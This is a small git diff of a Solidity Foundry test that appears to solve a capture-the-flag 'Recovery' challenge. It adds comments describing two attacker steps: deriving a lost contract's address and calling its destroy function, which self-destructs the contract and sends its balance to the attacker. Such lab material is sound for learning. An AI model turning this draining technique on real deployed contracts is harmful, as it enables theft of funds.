@@ -58,6 +58,8 @@ contract RecoveryTest is Test {
         emit log_string(
             "--------------------------------------------------------------------------"
         );
+
+        // 1. Attacker retrieves the lost address
         address lostAddress = address(
             uint160(
                 uint256(
@@ -87,6 +89,8 @@ contract RecoveryTest is Test {
         emit log_string(
             "--------------------------------------------------------------------------"
         );
+
+        // 2. Attacker calls the `destroy` function that will execute a `selfdestruct(_to)` sending all the contract's balance to the attacker address.
         SimpleToken(payable(lostAddress)).destroy(payable(attacker));
 
         emit log_named_uint(
